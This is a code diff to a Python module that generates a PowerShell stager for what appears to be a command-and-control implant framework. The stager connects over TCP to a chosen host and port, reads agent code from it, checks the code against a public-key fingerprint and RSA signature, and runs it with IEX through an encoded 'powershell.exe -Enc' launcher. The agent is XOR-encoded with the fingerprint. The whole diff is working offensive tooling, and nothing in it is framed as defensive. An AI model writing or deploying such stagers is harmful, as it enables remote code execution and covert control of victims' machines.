@@ -10,9 +10,11 @@ import base64
 
 
 DEBUG_MODULE = "PlatformPowershell"
-MAX_AGENT_LEN = 102400 # TODO: choose shorter value, when done writing agent => faster staging
+MIN_AGENT_LEN = 4000 # TODO: choose a value close to the real agent length
+MAX_AGENT_LEN = 10240 # TODO: choose shorter value, when done writing agent => faster staging
 SIGNATURE_ALGO = "SHA512"
 SIGNATURE_LEN = 512
+SIGNATURE_LEN_B64 = encryption.lenofb64coding(SIGNATURE_LEN)
 STATIC_SIGN_STRING = "syssspy"
 
 
@@ -110,13 +112,11 @@ class PlatformPowershell(Platform, ModuleBase):
     
     def _getfingerprint(self):
         """
-        returns the fingerprint = sha512(rsasign(PrivateKey, STATIC_SIGN_STRING))
-        to verify the server certificat in the stager and to also do stage encoding
+        returns the fingerprint = b64(sha512(rsapublickeyxml))
+        to verify the server certificate in the stager and to also do stage encoding
         """
         
-        sign = self._sign_data(STATIC_SIGN_STRING)
-        print_debug(DEBUG_MODULE, "signature length = {}".format(len(sign)))
-        return helpers.tls.sha512(sign)
+        return base64.b64encode(encryption.sha512(self.publickeyxml.encode())).decode()
 
     def _getrsapublickeyxml(self):
         if not self.certificate:
@@ -145,8 +145,8 @@ class PlatformPowershell(Platform, ModuleBase):
         if not self.certificate:
             print_error("Failed to load certificate, please check STAGECERTIFICATEFILE")
             return
-        self.fingerprint = self._getfingerprint()
         self.publickeyxml = self._getrsapublickeyxml()
+        self.fingerprint = self._getfingerprint()
 
     def validate_options(self):
         """
@@ -197,7 +197,8 @@ class PlatformPowershell(Platform, ModuleBase):
             stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
             stager += '$a=New-Object char[]({});'.format(MAX_AGENT_LEN)
             stager += '$r=New-Object IO.StreamReader($c.GetStream());'
-            stager += '$b=$r.Read($a,0,{});'.format(MAX_AGENT_LEN)
+            stager += '$b=0;'
+            stager += 'while($b -lt {}){{$b+=$r.Read($a,$b,{}-$b)}};'.format(MIN_AGENT_LEN, MAX_AGENT_LEN)
 
             # include fingerprint only if needed for STAGEENCODING and/or STAGEAUTHENTICATION
             if self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
@@ -216,21 +217,25 @@ class PlatformPowershell(Platform, ModuleBase):
                 parsepos=0 # next position to parse the array to string
                 stager += '$pk=New-Object String($a,{},{});'.format(parsepos, len(self.publickeyxml))
                 parsepos += len(self.publickeyxml)
-                stager += '$sig=New-Object String($a,{},{});'.format(parsepos,SIGNATURE_LEN)
-                parsepos += SIGNATURE_LEN
-                stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos,parsepos)
-                # TODO: this does not work, somehow $s is rubbisch!!!!                
+                stager += '$sig=New-Object String($a,{},{});'.format(parsepos,SIGNATURE_LEN_B64)
+                parsepos += SIGNATURE_LEN_B64
+                stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos,parsepos)            
 
-                # verify the public key and signature
-                stager += '$x=New-Object Security.Cryptography.RSACryptoServiceProvider(4096);'
+                # verify the public key
+                stager += '$sha=New-Object Security.Cryptography.SHA512Managed;'
+                stager += 'if(@(Compare-Object $sha.ComputeHash($pk.ToCharArray()) ([Convert]::FromBase64String($fp)) -SyncWindow 0).Length -ne 0){{"ERROR1";Exit(1)}};'.format(STATIC_SIGN_STRING, SIGNATURE_ALGO) # check fingerprint of server cert
+
+                # verify the signature of the code using the public key
+                stager += '$x=New-Object Security.Cryptography.RSACryptoServiceProvider;'
                 stager += '$x.FromXmlString($pk);'
-                stager += 'if(-Not $x.VerifyData("{}".ToCharArray(),"{}",$fp.ToCharArray())){{Write-Out 1}};'.format(SIGNATURE_ALGO, STATIC_SIGN_STRING) # check fingerprint of server cert # TODO: Exit(1)
-                stager += 'if(-Not $x.VerifyData($s.ToCharArray(),"{}",$sig.ToCharArray())){{Write-Out 2}};'.format(SIGNATURE_ALGO) # check signature of agent code # TODO: Exit(1)
+                stager += 'if(-Not $x.VerifyData($s.ToCharArray(),"{}",[Convert]::FromBase64String($sig))){{"ERROR2";Exit(2)}};'.format(SIGNATURE_ALGO) # check signature of agent code
+
+            # without stage authentication, no need for pk or signature yet
             else:
                 stager += '$s=New-Object String($a,0,$b);'
 
             # finally execute the agent
-            stager += 'IEX $s;'
+            stager += '"GOAGENT";IEX $s;'
             print_debug(DEBUG_MODULE, "stager = {}".format(stager))
             return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd
 
@@ -244,7 +249,7 @@ class PlatformPowershell(Platform, ModuleBase):
         Generate the full powershell agent string for this setup if possible
         """
 
-        print_debug("DEBUG_MODULE", "platformpath = {}".format(self.platformpath))
+        print_debug(DEBUG_MODULE, "platformpath = {}".format(self.platformpath))
         agent = ""
 
         # add selected transport implementation
@@ -291,17 +296,26 @@ class PlatformPowershell(Platform, ModuleBase):
 
         # ok, lets encode the agent
         agent = agent.encode('utf-8')
+        print_debug(DEBUG_MODULE, "len(real agent) = {}".format(len(agent)))
 
-        # TODO: stage authentication
+        # add spaces if the agent is too short for staging
+        if self.isstaged():
+            currentreallen = len(agent)
+            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+                currentreallen += len(self.publickeyxml) + SIGNATURE_LEN_B64
+            if currentreallen < MIN_AGENT_LEN:
+                print_error("agent is shorter than staging read, adding some spaces")
+                agent += b' ' * (MIN_AGENT_LEN-currentreallen)
+
+        # with stage authentication: publickey + signature + agentcode
         if self.isstaged() and self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
             self._initkeycertificate()
             if not self.publickeyxml:
                 print_error("Cannot sign agent, since STAGEAUTHENTICATION is active but creating the publickeyxml failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                 return None
             else:
-                #print_error("STAGEAUTHENTICATION not implemented yet")
                 print_debug(DEBUG_MODULE, "publickey as xml = {}".format(self.publickeyxml))
-                agent = self.publickeyxml.encode('utf-8') + self._sign_data(agent) + agent
+                agent = self.publickeyxml.encode('utf-8') + base64.b64encode(self._sign_data(agent)) + agent
 
         # encode agent with fingerprint as encodingkey if active
         if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
@@ -310,6 +324,8 @@ class PlatformPowershell(Platform, ModuleBase):
                 print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                 return None
             else:
+                #print_debug(DEBUG_MODULE, "agent = {}".format(agent))
+                #print_debug(DEBUG_MODULE, "fingerprint = {}".format(self.fingerprint))
                 agent = encryption.xor_encode(agent, self.fingerprint)
 
         if len(agent) > MAX_AGENT_LEN and self.isstaged():
